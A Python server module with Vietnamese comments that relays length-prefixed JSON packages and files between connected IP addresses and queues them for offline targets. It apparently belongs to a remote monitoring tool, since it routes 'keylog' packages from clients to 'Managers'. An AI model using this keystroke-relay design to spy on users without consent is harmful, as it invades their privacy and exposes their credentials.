# server_transfer.py

import threading
import json
import struct
import socket

# Biến dùng chung cho tất cả các luồng ServerTransferHandler
transfer_conns = {}  # {IP_Address: socket_object}
transfer_lock = threading.Lock()
unserved_queues = {}  # {IP_Address: [list_of_full_packages_bytes]} 

class ServerTransferHandler:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.ip = addr[0]
        self.file_transfer_state = {
            "is_active": False,
            "target_ip": None,
            "file_size": 0,
            "bytes_processed": 0,
        }
        
    def serve_queued_packages(self, target_ip, conn):
        """Phục vụ các gói đang chờ cho IP mới kết nối."""
        global unserved_queues
        if target_ip in unserved_queues:
            print(f"[SERVER-TRANSFER] Serving {len(unserved_queues[target_ip])} queued packages to {target_ip}")
            try:
                for package in unserved_queues[target_ip]:
                    conn.sendall(package)
                
                del unserved_queues[target_ip] # Xóa hàng đợi sau khi gửi
            except Exception as e:
                print(f"[SERVER-TRANSFER] Error serving queued packages to {target_ip}: {e}")
        
    def run(self):
        print(f"[SERVER-TRANSFER] Connection established from: {self.ip}")
        
        # Thêm kết nối vào danh sách theo IP và phục vụ hàng đợi
        with transfer_lock:
            transfer_conns[self.ip] = self.conn
            self.serve_queued_packages(self.ip, self.conn) # ⚡ PHỤC VỤ HÀNG ĐỢI
            
        try:
            buffer = b""
            while True:
                data = self.conn.recv(4096)
                if not data:
                    break
                
                buffer += data
                
                while len(buffer) >= 4:
                    package_size_bytes = buffer[:4]
                    if len(package_size_bytes) < 4:
                         break
                         
                    package_size = struct.unpack('!I', package_size_bytes)[0]
                    
                    if len(buffer) >= 4 + package_size:
                        package_data = buffer[4:4 + package_size]
                        buffer = buffer[4 + package_size:]
                        
                        self.handle_package(package_data)
                    else:
                        break
                         
        except Exception as e:
            print(f"[SERVER-TRANSFER] Error for {self.ip}: {e}")
            
        finally:
            print(f"[SERVER-TRANSFER] Disconnected: {self.ip}")
            with transfer_lock:
                if self.ip in transfer_conns and transfer_conns[self.ip] == self.conn:
                    del transfer_conns[self.ip]
            self.conn.close()

    def handle_package(self, package_data):
        global unserved_queues
        try:
            package_str = package_data.decode('utf-8')
            pkg = json.loads(package_str)
            
            target_ip = pkg.get("target_ip")
            pkg["sender"] = self.ip 
            pkg_type = pkg.get("type")
            
            # --- Cập nhật trạng thái truyền file ---
            if pkg_type == "file_meta":
                self.file_transfer_state["is_active"] = True
                self.file_transfer_state["target_ip"] = target_ip
                file_size = pkg["data"].get("size", 0)
                self.file_transfer_state["file_size"] = file_size
                self.file_transfer_state["bytes_processed"] = 0
                print(f"[SERVER-TRANSFER] File meta received. Size: {file_size}. Relaying meta...")
            elif pkg_type == "file_data":
                estimated_bytes = pkg["data"].get("bytes", 0) 
                self.file_transfer_state["bytes_processed"] += estimated_bytes
            elif pkg_type == "file_end":
                print(f"[SERVER-TRANSFER] File transfer complete ({self.file_transfer_state['file_size']} bytes).")
                self.file_transfer_state["is_active"] = False

            if pkg_type == "keylog":
                target_ip = 'all' # Bắt buộc gửi tới Manager
                print(f"[SERVER-TRANSFER] Received KEYLOG from {self.ip}. Relaying to Managers.")
            
            # ⚡ Relay gói JSON (hoặc ĐƯA VÀO HÀNG ĐỢI)
            if target_ip:
                full_package_to_send = struct.pack('!I', len(package_str)) + package_data
                
                with transfer_lock:
                    if target_ip in transfer_conns:
                        target_conn = transfer_conns[target_ip]
                        try:
                            target_conn.sendall(full_package_to_send)
                        except Exception as e:
                            print(f"[SERVER-TRANSFER] Failed to relay to {target_ip}: {e}")
                            if target_ip in transfer_conns: del transfer_conns[target_ip]
                            
                    else:
                        # ⚡ LƯU TRỮ VÀO HÀNG ĐỢI
                        print(f"[SERVER-TRANSFER] Target {target_ip} NOT CONNECTED. Queuing package: {pkg_type}")
                        if target_ip not in unserved_queues:
                            unserved_queues[target_ip] = []
                        unserved_queues[target_ip].append(full_package_to_send)
                        
        except json.JSONDecodeError:
            print("[SERVER-TRANSFER] Received non-JSON data (Ignored).")
        except Exception as e:
            print(f"[SERVER-TRANSFER] Handling error: {e}")

# Hàm tiện ích để đóng tất cả kết nối transfer khi server shutdown
def close_all_transfer_connections():
    with transfer_lock:
        for ip, conn in list(transfer_conns.items()):
            try:
                conn.shutdown(socket.SHUT_RDWR)
                conn.close()
            except Exception:
                pass
        transfer_conns.clear()